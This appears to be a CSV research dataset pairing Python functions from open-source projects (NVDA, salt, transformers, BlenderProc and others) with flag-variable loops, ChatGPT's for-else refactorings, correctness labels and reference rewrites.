repo_name,file_path,file_html,class_name,me_name,me_code,old_code,chatGPT_code,element_str,slice_str,truth_code
nvda,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/nvda/source/NVDAObjects/IAccessible/winword.py,https://github.com/nvaccess/nvda/tree/master/source/NVDAObjects/IAccessible/winword.py,WordDocument,_moveInTable$292,"def _moveInTable(self,row=True,forward=True):
		info=self.makeTextInfo(textInfos.POSITION_CARET)
		info.expand(textInfos.UNIT_CHARACTER)
		formatConfig=config.conf['documentFormatting'].copy()
		formatConfig['reportTables']=True
		commandList=info.getTextWithFields(formatConfig)
		if len(commandList)<3 or commandList[1].field.get('role',None)!=controlTypes.Role.TABLE or commandList[2].field.get('role',None)!=controlTypes.Role.TABLECELL:
			# Translators: The message reported when a user attempts to use a table movement command
			# when the cursor is not withnin a table.
			ui.message(_(""Not in table""))
			return False
		rowCount=commandList[1].field.get('table-rowcount',1)
		columnCount=commandList[1].field.get('table-columncount',1)
		rowNumber=commandList[2].field.get('table-rownumber',1)
		columnNumber=commandList[2].field.get('table-columnnumber',1)
		try:
			table=info._rangeObj.tables[1]
		except COMError:
			log.debugWarning(""Could not get MS Word table object indicated in XML"")
			ui.message(_(""Not in table""))
			return False
		_cell=table.cell
		getCell=lambda thisIndex,otherIndex: _cell(thisIndex,otherIndex) if row else _cell(otherIndex,thisIndex)
		thisIndex=rowNumber if row else columnNumber
		otherIndex=columnNumber if row else rowNumber
		thisLimit=(rowCount if row else columnCount) if forward else 1
		limitOp = operator.le if forward else operator.ge
		incdecFunc = operator.add if forward else operator.sub
		foundCell=None
		curOtherIndex=otherIndex
		while curOtherIndex>0:
			curThisIndex=incdecFunc(thisIndex,1)
			while limitOp(curThisIndex,thisLimit):
				try:
					foundCell=getCell(curThisIndex,curOtherIndex).range
				except COMError:
					pass
				if foundCell: break
				curThisIndex=incdecFunc(curThisIndex,1)
			if foundCell: break
			curOtherIndex-=1
		if not foundCell:
			ui.message(_(""Edge of table""))
			return False
		newInfo = winWordWindowModule.WordDocumentTextInfo(
			self, textInfos.POSITION_CARET, _rangeObj=foundCell
		)
		speech.speakTextInfo(newInfo, reason=controlTypes.OutputReason.CARET, unit=textInfos.UNIT_CELL)
		newInfo.collapse()
		newInfo.updateCaret()
		return True","while curOtherIndex > 0:
    curThisIndex = incdecFunc(thisIndex, 1)
    while limitOp(curThisIndex, thisLimit):
        try:
            foundCell = getCell(curThisIndex, curOtherIndex).range
        except COMError:
            pass
        if foundCell:
            break
        curThisIndex = incdecFunc(curThisIndex, 1)
    if foundCell:
        break
    curOtherIndex -= 1
if not foundCell:
    ui.message(_('Edge of table'))
    return False","while curOtherIndex > 0:
    curThisIndex = incdecFunc(thisIndex, 1)
    while limitOp(curThisIndex, thisLimit):
        try:
            foundCell = getCell(curThisIndex, curOtherIndex).range
        except COMError:
            pass
        if foundCell:
            break
        curThisIndex = incdecFunc(curThisIndex, 1)
    if foundCell:
        break
    curOtherIndex -= 1
else:
    ui.message(_('Edge of table'))
    return False","while curOtherIndex > 0:
    curThisIndex = incdecFunc(thisIndex, 1)
    while limitOp(curThisIndex, thisLimit):
        try:
            foundCell = getCell(curThisIndex, curOtherIndex).range
        except COMError:
            pass
        if foundCell:
            break
        curThisIndex = incdecFunc(curThisIndex, 1)
    if foundCell:
        break
    curOtherIndex -= 1
else:
    ui.message(_('Edge of table'))
    return False",1,"while curOtherIndex > 0:
    curThisIndex = incdecFunc(thisIndex, 1)
    while limitOp(curThisIndex, thisLimit):
        try:
            foundCell = getCell(curThisIndex, curOtherIndex).range
        except COMError:
            pass
        if foundCell:
            break
        curThisIndex = incdecFunc(curThisIndex, 1)
    if foundCell:
        break
    curOtherIndex -= 1
if not foundCell:
    ui.message(_('Edge of table'))
    return False","break statement is executed:None
break statement is not executed:zejun1"
aws-parallelcluster,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/aws-parallelcluster/cli/src/pcluster/validators/cluster_validators.py,https://github.com/aws/aws-parallelcluster/tree/master/cli/src/pcluster/validators/cluster_validators.py,ExistingFsxNetworkingValidator,_get_missing_ports$549,"def _get_missing_ports(self, are_all_security_groups_customized, network_interfaces, ports, protocol):
        missing_ports = []
        for port in ports:
            fs_access = False
            for network_interface in network_interfaces:
                # Get list of security group IDs
                sg_ids = [sg.get(""GroupId"") for sg in network_interface.get(""Groups"")]
                if _check_in_out_access(
                    sg_ids,
                    port=port,
                    is_cidr_optional=are_all_security_groups_customized,
                    protocol=protocol,
                ):
                    fs_access = True
                    break
            if not fs_access:
                missing_ports.append(port)
        return missing_ports","for network_interface in network_interfaces:
    sg_ids = [sg.get('GroupId') for sg in network_interface.get('Groups')]
    if _check_in_out_access(sg_ids, port=port, is_cidr_optional=are_all_security_groups_customized, protocol=protocol):
        fs_access = True
        break
if not fs_access:
    missing_ports.append(port)","for network_interface in network_interfaces:
    sg_ids = [sg.get('GroupId') for sg in network_interface.get('Groups')]
    if _check_in_out_access(sg_ids, port=port, is_cidr_optional=are_all_security_groups_customized, protocol=protocol):
        break
else:
    missing_ports.append(port)","for network_interface in network_interfaces:
    sg_ids = [sg.get('GroupId') for sg in network_interface.get('Groups')]
    if _check_in_out_access(sg_ids, port=port, is_cidr_optional=are_all_security_groups_customized, protocol=protocol):
        break
else:
    missing_ports.append(port)",1,"for network_interface in network_interfaces:
    sg_ids = [sg.get('GroupId') for sg in network_interface.get('Groups')]
    if _check_in_out_access(sg_ids, port=port, is_cidr_optional=are_all_security_groups_customized, protocol=protocol):
        fs_access = True
        break
if not fs_access:
    missing_ports.append(port)","break statement is executed:None
break statement is not executed:zejun1"
Chinese_segment_augment,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Chinese_segment_augment/model.py,https://github.com/zhanzecheng/Chinese_segment_augment/tree/master//model.py,TrieNode,find_word$219,"def find_word(self, N):
        # 通过搜索得到互信息
        # 例如: dict{ ""a_b"": (PMI, 出现概率), .. }
        bi = self.search_bi()
        # 通过搜索得到左右熵
        left = self.search_left()
        right = self.search_right()
        result = {}
        for key, values in bi.items():
            d = """".join(key.split('_'))
            # 计算公式 score = PMI + min(左熵， 右熵) => 熵越小，说明越有序，这词再一次可能性更大！
            result[key] = (values[0] + min(left[d], right[d])) * values[1]

        # 按照 大到小倒序排列，value 值越大，说明是组合词的概率越大
        # result变成 => [('世界卫生_大会', 0.4380419441616299), ('蔡_英文', 0.28882968751888893) ..]
        result = sorted(result.items(), key=lambda x: x[1], reverse=True)
        print(""result: "", result)
        dict_list = [result[0][0]]
        # print(""dict_list: "", dict_list)
        add_word = {}
        new_word = """".join(dict_list[0].split('_'))
        # 获得概率
        add_word[new_word] = result[0][1]

        # 取前5个
        # [('蔡_英文', 0.28882968751888893), ('民进党_当局', 0.2247420989996931), ('陈时_中', 0.15996145099751344), ('九二_共识', 0.14723726297223602)]
        for d in result[1: N]:
            flag = True
            for tmp in dict_list:
                pre = tmp.split('_')[0]
                # 新出现单词后缀，再老词的前缀中 or 如果发现新词，出现在列表中; 则跳出循环 
                # 前面的逻辑是： 如果A和B组合，那么B和C就不能组合(这个逻辑有点问题)，例如：`蔡_英文` 出现，那么 `英文_也` 这个不是新词
                # 疑惑: **后面的逻辑，这个是完全可能出现，毕竟没有重复**
                if d[0].split('_')[-1] == pre or """".join(tmp.split('_')) in """".join(d[0].split('_')):
                    flag = False
                    break
            if flag:
                new_word = """".join(d[0].split('_'))
                add_word[new_word] = d[1]
                dict_list.append(d[0])

        return result, add_word","for tmp in dict_list:
    pre = tmp.split('_')[0]
    if d[0].split('_')[-1] == pre or ''.join(tmp.split('_')) in ''.join(d[0].split('_')):
        flag = False
        break
if flag:
    new_word = ''.join(d[0].split('_'))
    add_word[new_word] = d[1]
    dict_list.append(d[0])","for tmp in dict_list:
    pre = tmp.split('_')[0]
    if d[0].split('_')[-1] == pre or ''.join(tmp.split('_')) in ''.join(d[0].split('_')):
        break
else:
    new_word = ''.join(d[0].split('_'))
    add_word[new_word] = d[1]
    dict_list.append(d[0])","for tmp in dict_list:
    pre = tmp.split('_')[0]
    if d[0].split('_')[-1] == pre or ''.join(tmp.split('_')) in ''.join(d[0].split('_')):
        break
else:
    new_word = ''.join(d[0].split('_'))
    add_word[new_word] = d[1]
    dict_list.append(d[0])",1,"for tmp in dict_list:
    pre = tmp.split('_')[0]
    if d[0].split('_')[-1] == pre or ''.join(tmp.split('_')) in ''.join(d[0].split('_')):
        flag = False
        break
if flag:
    new_word = ''.join(d[0].split('_'))
    add_word[new_word] = d[1]
    dict_list.append(d[0])","break statement is executed:None
break statement is not executed:zejun1"
BlenderProc,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/BlenderProc/blenderproc/python/object/OnSurfaceSampler.py,https://github.com/DLR-RM/BlenderProc/tree/master/blenderproc/python/object/OnSurfaceSampler.py,,sample_poses_on_surface$12,"def sample_poses_on_surface(objects_to_sample: List[MeshObject], surface: MeshObject,
                            sample_pose_func: Callable[[MeshObject], None], max_tries: int = 100,
                            min_distance: float = 0.25, max_distance: float = 0.6,
                            up_direction: Optional[np.ndarray] = None,
                            check_all_bb_corners_over_surface: bool = True) -> List[MeshObject]:
    """""" Samples objects poses on a surface.

    The objects are positioned slightly above the surface due to the non-axis aligned nature of used bounding boxes
    and possible non-alignment of the sampling surface (i.e. on the X-Y hyperplane, can be somewhat mitigated with
    precise ""up_direction"" value), which leads to the objects hovering slightly above the surface. So it is
    recommended to use the PhysicsPositioning module afterwards for realistically looking placements of objects on
    the sampling surface.

    :param objects_to_sample: A list of objects that should be sampled above the surface.
    :param surface: Object to place objects_to_sample on.
    :param sample_pose_func: The function to use for sampling the pose of a given object.
    :param max_tries: Amount of tries before giving up on an object (deleting it) and moving to the next one.
    :param min_distance: Minimum distance to the closest other object from objects_to_sample. Center to center.
    :param max_distance: Maximum distance to the closest other object from objects_to_sample. Center to center.
    :param up_direction: Normal vector of the side of surface the objects should be placed on.
    :param check_all_bb_corners_over_surface: If this is True all bounding box corners have to be above the surface,
                                              else only the center of the object has to be above the surface
    :return: The list of placed objects.
    """"""
    if up_direction is None:
        up_direction = np.array([0., 0., 1.])
    else:
        up_direction /= np.linalg.norm(up_direction)

    surface_bounds = surface.get_bound_box()
    surface_height = max(up_direction.dot(corner) for corner in surface_bounds)

    # cache to fasten collision detection
    bvh_cache: Dict[str, mathutils.bvhtree.BVHTree] = {}

    placed_objects: List[MeshObject] = []
    for obj in objects_to_sample:
        print(f""Trying to put {obj.get_name()}"")

        placed_successfully = False

        for i in range(max_tries):
            sample_pose_func(obj)
            # Remove bvh cache, as object has changed
            if obj.get_name() in bvh_cache:
                del bvh_cache[obj.get_name()]

            if not CollisionUtility.check_intersections(obj, bvh_cache, placed_objects, []):
                print(""Collision detected, retrying!"")
                continue

            if not _OnSurfaceSampler.check_above_surface(obj, surface, up_direction, check_all_bb_corners_over_surface):
                print(""Not above surface, retrying!"")
                continue

            _OnSurfaceSampler.drop(obj, up_direction, surface_height)
            # Remove bvh cache, as object has changed
            if obj.get_name() in bvh_cache:
                del bvh_cache[obj.get_name()]

            if not _OnSurfaceSampler.check_above_surface(obj, surface, up_direction, check_all_bb_corners_over_surface):
                print(""Not above surface after drop, retrying!"")
                continue

            if not _OnSurfaceSampler.check_spacing(obj, placed_objects, min_distance, max_distance):
                print(""Bad spacing after drop, retrying!"")
                continue

            if not CollisionUtility.check_intersections(obj, bvh_cache, placed_objects, []):
                print(""Collision detected after drop, retrying!"")
                continue

            print(f""Placed object \""{obj.get_name()}\"" successfully at {obj.get_location()} after {i + 1} iterations!"")
            placed_objects.append(obj)

            placed_successfully = True
            break

        if not placed_successfully:
            print(f""Giving up on {obj.get_name()}, deleting..."")
            obj.delete()

    return placed_objects","for i in range(max_tries):
    sample_pose_func(obj)
    if obj.get_name() in bvh_cache:
        del bvh_cache[obj.get_name()]
    if not CollisionUtility.check_intersections(obj, bvh_cache, placed_objects, []):
        print('Collision detected, retrying!')
        continue
    if not _OnSurfaceSampler.check_above_surface(obj, surface, up_direction, check_all_bb_corners_over_surface):
        print('Not above surface, retrying!')
        continue
    _OnSurfaceSampler.drop(obj, up_direction, surface_height)
    if obj.get_name() in bvh_cache:
        del bvh_cache[obj.get_name()]
    if not _OnSurfaceSampler.check_above_surface(obj, surface, up_direction, check_all_bb_corners_over_surface):
        print('Not above surface after drop, retrying!')
        continue
    if not _OnSurfaceSampler.check_spacing(obj, placed_objects, min_distance, max_distance):
        print('Bad spacing after drop, retrying!')
        continue
    if not CollisionUtility.check_intersections(obj, bvh_cache, placed_objects, []):
        print('Collision detected after drop, retrying!')
        continue
    print(f'Placed object ""{obj.get_name()}"" successfully at {obj.get_location()} after {i + 1} iterations!')
    placed_objects.append(obj)
    placed_successfully = True
    break
if not placed_successfully:
    print(f'Giving up on {obj.get_name()}, deleting...')
    obj.delete()","for i in range(max_tries):
    sample_pose_func(obj)
    if obj.get_name() in bvh_cache:
        del bvh_cache[obj.get_name()]
    if not CollisionUtility.check_intersections(obj, bvh_cache, placed_objects, []):
        print('Collision detected, retrying!')
        continue
    if not _OnSurfaceSampler.check_above_surface(obj, surface, up_direction, check_all_bb_corners_over_surface):
        print('Not above surface, retrying!')
        continue
    _OnSurfaceSampler.drop(obj, up_direction, surface_height)
    if obj.get_name() in bvh_cache:
        del bvh_cache[obj.get_name()]
    if not _OnSurfaceSampler.check_above_surface(obj, surface, up_direction, check_all_bb_corners_over_surface):
        print('Not above surface after drop, retrying!')
        continue
    if not _OnSurfaceSampler.check_spacing(obj, placed_objects, min_distance, max_distance):
        print('Bad spacing after drop, retrying!')
        continue
    if not CollisionUtility.check_intersections(obj, bvh_cache, placed_objects, []):
        print('Collision detected after drop, retrying!')
        continue
    print(f'Placed object ""{obj.get_name()}"" successfully at {obj.get_location()} after {i + 1} iterations!')
    placed_objects.append(obj)
    break
else:
    print(f'Giving up on {obj.get_name()}, deleting...')
    obj.delete()","for i in range(max_tries):
    sample_pose_func(obj)
    if obj.get_name() in bvh_cache:
        del bvh_cache[obj.get_name()]
    if not CollisionUtility.check_intersections(obj, bvh_cache, placed_objects, []):
        print('Collision detected, retrying!')
        continue
    if not _OnSurfaceSampler.check_above_surface(obj, surface, up_direction, check_all_bb_corners_over_surface):
        print('Not above surface, retrying!')
        continue
    _OnSurfaceSampler.drop(obj, up_direction, surface_height)
    if obj.get_name() in bvh_cache:
        del bvh_cache[obj.get_name()]
    if not _OnSurfaceSampler.check_above_surface(obj, surface, up_direction, check_all_bb_corners_over_surface):
        print('Not above surface after drop, retrying!')
        continue
    if not _OnSurfaceSampler.check_spacing(obj, placed_objects, min_distance, max_distance):
        print('Bad spacing after drop, retrying!')
        continue
    if not CollisionUtility.check_intersections(obj, bvh_cache, placed_objects, []):
        print('Collision detected after drop, retrying!')
        continue
    print(f'Placed object ""{obj.get_name()}"" successfully at {obj.get_location()} after {i + 1} iterations!')
    placed_objects.append(obj)
    break
else:
    print(f'Giving up on {obj.get_name()}, deleting...')
    obj.delete()",1,"for i in range(max_tries):
    sample_pose_func(obj)
    if obj.get_name() in bvh_cache:
        del bvh_cache[obj.get_name()]
    if not CollisionUtility.check_intersections(obj, bvh_cache, placed_objects, []):
        print('Collision detected, retrying!')
        continue
    if not _OnSurfaceSampler.check_above_surface(obj, surface, up_direction, check_all_bb_corners_over_surface):
        print('Not above surface, retrying!')
        continue
    _OnSurfaceSampler.drop(obj, up_direction, surface_height)
    if obj.get_name() in bvh_cache:
        del bvh_cache[obj.get_name()]
    if not _OnSurfaceSampler.check_above_surface(obj, surface, up_direction, check_all_bb_corners_over_surface):
        print('Not above surface after drop, retrying!')
        continue
    if not _OnSurfaceSampler.check_spacing(obj, placed_objects, min_distance, max_distance):
        print('Bad spacing after drop, retrying!')
        continue
    if not CollisionUtility.check_intersections(obj, bvh_cache, placed_objects, []):
        print('Collision detected after drop, retrying!')
        continue
    print(f'Placed object ""{obj.get_name()}"" successfully at {obj.get_location()} after {i + 1} iterations!')
    placed_objects.append(obj)
    placed_successfully = True
    break
if not placed_successfully:
    print(f'Giving up on {obj.get_name()}, deleting...')
    obj.delete()","break statement is executed:None
break statement is not executed:zejun1"
salt,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/salt/salt/states/boto_secgroup.py,https://github.com/saltstack/salt/tree/master/salt/states/boto_secgroup.py,,_get_rule_changes$391,"def _get_rule_changes(rules, _rules):
    """"""
    given a list of desired rules (rules) and existing rules (_rules) return
    a list of rules to delete (to_delete) and to create (to_create)
    """"""
    to_delete = []
    to_create = []
    # for each rule in state file
    # 1. validate rule
    # 2. determine if rule exists in existing security group rules
    for rule in rules:
        try:
            ip_protocol = str(rule.get(""ip_protocol""))
        except KeyError:
            raise SaltInvocationError(
                ""ip_protocol, to_port, and from_port are""
                "" required arguments for security group""
                "" rules.""
            )
        supported_protocols = [
            ""tcp"",
            ""6"",
            6,
            ""udp"",
            ""17"",
            17,
            ""icmp"",
            ""1"",
            1,
            ""all"",
            ""-1"",
            -1,
        ]
        if ip_protocol not in supported_protocols and (
            not ""{}"".format(ip_protocol).isdigit() or int(ip_protocol) > 255
        ):
            raise SaltInvocationError(
                ""Invalid ip_protocol {} specified in security group rule."".format(
                    ip_protocol
                )
            )
        # For the 'all' case, we need to change the protocol name to '-1'.
        if ip_protocol == ""all"":
            rule[""ip_protocol""] = ""-1""
        cidr_ip = rule.get(""cidr_ip"", None)
        group_name = rule.get(""source_group_name"", None)
        group_id = rule.get(""source_group_group_id"", None)
        if cidr_ip and (group_id or group_name):
            raise SaltInvocationError(
                ""cidr_ip and source groups can not both""
                "" be specified in security group rules.""
            )
        if group_id and group_name:
            raise SaltInvocationError(
                ""Either source_group_group_id or""
                "" source_group_name can be specified in""
                "" security group rules, but not both.""
            )
        if not (cidr_ip or group_id or group_name):
            raise SaltInvocationError(
                ""cidr_ip, source_group_group_id, or""
                "" source_group_name must be provided for""
                "" security group rules.""
            )
        rule_found = False
        # for each rule in existing security group ruleset determine if
        # new rule exists
        for _rule in _rules:
            if _check_rule(rule, _rule):
                rule_found = True
                break
        if not rule_found:
            to_create.append(rule)
    # for each rule in existing security group configuration
    # 1. determine if rules needed to be deleted
    for _rule in _rules:
        rule_found = False
        for rule in rules:
            if _check_rule(rule, _rule):
                rule_found = True
                break
        if not rule_found:
            # Can only supply name or id, not both. Since we're deleting
            # entries, it doesn't matter which we pick.
            _rule.pop(""source_group_name"", None)
            to_delete.append(_rule)
    log.debug(""Rules to be deleted: %s"", to_delete)
    log.debug(""Rules to be created: %s"", to_create)
    return (to_delete, to_create)","for _rule in _rules:
    if _check_rule(rule, _rule):
        rule_found = True
        break
if not rule_found:
    to_create.append(rule)","for _rule in _rules:
    if _check_rule(rule, _rule):
        rule_found = True
        break
else:
    to_create.append(rule)","for _rule in _rules:
    if _check_rule(rule, _rule):
        break
else:
    to_create.append(rule)",0,"for _rule in _rules:
    if _check_rule(rule, _rule):
        rule_found = True
        break
if not rule_found:
    to_create.append(rule)","break statement is executed:None
break statement is not executed:zejun1"
salt,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/salt/salt/states/boto_secgroup.py,https://github.com/saltstack/salt/tree/master/salt/states/boto_secgroup.py,,_get_rule_changes$391,"def _get_rule_changes(rules, _rules):
    """"""
    given a list of desired rules (rules) and existing rules (_rules) return
    a list of rules to delete (to_delete) and to create (to_create)
    """"""
    to_delete = []
    to_create = []
    # for each rule in state file
    # 1. validate rule
    # 2. determine if rule exists in existing security group rules
    for rule in rules:
        try:
            ip_protocol = str(rule.get(""ip_protocol""))
        except KeyError:
            raise SaltInvocationError(
                ""ip_protocol, to_port, and from_port are""
                "" required arguments for security group""
                "" rules.""
            )
        supported_protocols = [
            ""tcp"",
            ""6"",
            6,
            ""udp"",
            ""17"",
            17,
            ""icmp"",
            ""1"",
            1,
            ""all"",
            ""-1"",
            -1,
        ]
        if ip_protocol not in supported_protocols and (
            not ""{}"".format(ip_protocol).isdigit() or int(ip_protocol) > 255
        ):
            raise SaltInvocationError(
                ""Invalid ip_protocol {} specified in security group rule."".format(
                    ip_protocol
                )
            )
        # For the 'all' case, we need to change the protocol name to '-1'.
        if ip_protocol == ""all"":
            rule[""ip_protocol""] = ""-1""
        cidr_ip = rule.get(""cidr_ip"", None)
        group_name = rule.get(""source_group_name"", None)
        group_id = rule.get(""source_group_group_id"", None)
        if cidr_ip and (group_id or group_name):
            raise SaltInvocationError(
                ""cidr_ip and source groups can not both""
                "" be specified in security group rules.""
            )
        if group_id and group_name:
            raise SaltInvocationError(
                ""Either source_group_group_id or""
                "" source_group_name can be specified in""
                "" security group rules, but not both.""
            )
        if not (cidr_ip or group_id or group_name):
            raise SaltInvocationError(
                ""cidr_ip, source_group_group_id, or""
                "" source_group_name must be provided for""
                "" security group rules.""
            )
        rule_found = False
        # for each rule in existing security group ruleset determine if
        # new rule exists
        for _rule in _rules:
            if _check_rule(rule, _rule):
                rule_found = True
                break
        if not rule_found:
            to_create.append(rule)
    # for each rule in existing security group configuration
    # 1. determine if rules needed to be deleted
    for _rule in _rules:
        rule_found = False
        for rule in rules:
            if _check_rule(rule, _rule):
                rule_found = True
                break
        if not rule_found:
            # Can only supply name or id, not both. Since we're deleting
            # entries, it doesn't matter which we pick.
            _rule.pop(""source_group_name"", None)
            to_delete.append(_rule)
    log.debug(""Rules to be deleted: %s"", to_delete)
    log.debug(""Rules to be created: %s"", to_create)
    return (to_delete, to_create)","for rule in rules:
    if _check_rule(rule, _rule):
        rule_found = True
        break
if not rule_found:
    _rule.pop('source_group_name', None)
    to_delete.append(_rule)","for rule in rules:
    if _check_rule(rule, _rule):
        break
else:
    _rule.pop('source_group_name', None)
    to_delete.append(_rule)","for rule in rules:
    if _check_rule(rule, _rule):
        break
else:
    _rule.pop('source_group_name', None)
    to_delete.append(_rule)",1,"for rule in rules:
    if _check_rule(rule, _rule):
        rule_found = True
        break
if not rule_found:
    _rule.pop('source_group_name', None)
    to_delete.append(_rule)","break statement is executed:None
break statement is not executed:zejun1"
transformers,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/transformers/src/transformers/models/mpnet/tokenization_mpnet.py,https://github.com/huggingface/transformers/tree/master/src/transformers/models/mpnet/tokenization_mpnet.py,WordpieceTokenizer,tokenize$486,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, `input = ""unaffable""` wil return as output `[""un"", ""##aff"", ""##able""]`.

        Args:
            text: A single token or whitespace separated tokens. This should have
                already been passed through *BasicTokenizer*.

        Returns:
            A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
transformers,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/transformers/src/transformers/models/mpnet/tokenization_mpnet.py,https://github.com/huggingface/transformers/tree/master/src/transformers/models/mpnet/tokenization_mpnet.py,WordpieceTokenizer,tokenize$486,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, `input = ""unaffable""` wil return as output `[""un"", ""##aff"", ""##able""]`.

        Args:
            text: A single token or whitespace separated tokens. This should have
                already been passed through *BasicTokenizer*.

        Returns:
            A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
tartube,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/tartube/tartube/mainapp.py,https://github.com/axcore/tartube/tree/master/tartube/mainapp.py,TartubeApp,on_menu_tidy_up$24947,"def on_menu_tidy_up(self, action, par):

        """"""Called from a callback in self.do_startup().

        Start a tidy operation to tidy up Tartube's data directory.

        Args:

            action (Gio.SimpleAction): Object generated by Gio

            par (None): Ignored

        """"""

        # Prompt the user to specify which actions should be applied to
        #   Tartube's data directory
        dialogue_win = mainwin.TidyDialogue(self.main_win_obj)
        response = dialogue_win.run()

        if response == Gtk.ResponseType.OK:

            # Retrieve user choices from the dialogue window
            # N.B. Any changes to this section must be copied to
            #   mainwin.MainWin.on_video_index_tidy
            choices_dict = {
                'media_data_obj': None,
                'corrupt_flag': dialogue_win.checkbutton.get_active(),
                'del_corrupt_flag': dialogue_win.checkbutton2.get_active(),
                'exist_flag': dialogue_win.checkbutton3.get_active(),
                'del_video_flag': dialogue_win.checkbutton4.get_active(),
                'del_others_flag': dialogue_win.checkbutton5.get_active(),
                'remove_no_url_flag': dialogue_win.checkbutton6.get_active(),
                'remove_dupe_flag': dialogue_win.checkbutton7.get_active(),
                'del_archive_flag': dialogue_win.checkbutton8.get_active(),
                'move_thumb_flag': dialogue_win.checkbutton9.get_active(),
                'del_thumb_flag': dialogue_win.checkbutton10.get_active(),
                'del_webp_flag': dialogue_win.checkbutton11.get_active(),
                'convert_webp_flag': dialogue_win.checkbutton12.get_active(),
                'move_data_flag': dialogue_win.checkbutton13.get_active(),
                'del_descrip_flag': dialogue_win.checkbutton14.get_active(),
                'del_json_flag': dialogue_win.checkbutton15.get_active(),
                'del_xml_flag': dialogue_win.checkbutton16.get_active(),
            }

        # Now destroy the window
        dialogue_win.destroy()

        if response == Gtk.ResponseType.OK:

            # If nothing was selected, then there is nothing to do
            selected_flag = False
            for key in choices_dict.keys():
                if choices_dict[key]:
                    selected_flag = True
                    break

            if not selected_flag:
                return

            # Prompt the user for confirmation, before deleting any files
            if choices_dict['del_corrupt_flag'] \
            or choices_dict['del_video_flag'] \
            or choices_dict['del_archive_flag'] \
            or choices_dict['del_thumb_flag'] \
            or choices_dict['del_webp_flag'] \
            or choices_dict['del_descrip_flag'] \
            or choices_dict['del_json_flag'] \
            or choices_dict['del_xml_flag']:

                self.dialogue_manager_obj.show_msg_dialogue(
                    _(
                    'Files cannot be recovered, after being deleted. Are you' \
                    + ' sure you want to continue?',
                    ),
                    'question',
                    'yes-no',
                    None,                   # Parent window is main window
                    {
                        'yes': 'tidy_manager_start',
                        # Specified options
                        'data': choices_dict,
                    },
                )

            else:

                # Start the tidy operation now
                self.tidy_manager_start(choices_dict)","for key in choices_dict.keys():
    if choices_dict[key]:
        selected_flag = True
        break
if not selected_flag:
    return","for key in choices_dict.keys():
    if choices_dict[key]:
        break
else:
    return","for key in choices_dict.keys():
    if choices_dict[key]:
        break
else:
    return",1,"for key in choices_dict.keys():
    if choices_dict[key]:
        selected_flag = True
        break
if not selected_flag:
    return","break statement is executed:None
break statement is not executed:zejun1"
